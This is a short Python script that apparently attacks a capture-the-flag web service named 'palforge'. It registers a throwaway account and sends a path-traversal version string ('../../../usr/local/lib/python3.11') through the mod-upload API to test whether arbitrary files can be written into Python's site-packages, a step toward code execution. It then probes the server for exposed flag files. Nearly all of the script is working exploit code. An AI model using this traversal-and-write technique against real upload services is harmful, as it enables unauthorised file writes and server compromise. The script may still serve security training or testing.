import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
def plant(tok, ver, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})
tok,u=fresh()
# test site-packages writability
st = plant(tok, "../../../usr/local/lib/python3.11", "site-packages", "zz.txt", b"x")
print("write site-packages ->", st.status_code, st.text[:80])
# probe for existing flag files served
for name in ["flag.txt","f.txt","out.txt","flag","1.txt","x.txt","result.txt","/media/flag.txt"]:
    c = requests.get(BASE+("/"+name if not name.startswith("/") else name), timeout=6)
    if c.status_code==200 and "doctype" not in c.text[:50].lower() and len(c.text)<2000:
        print("FOUND", name, c.status_code, repr(c.text[:120]))
    else:
        print(" -", name, c.status_code)
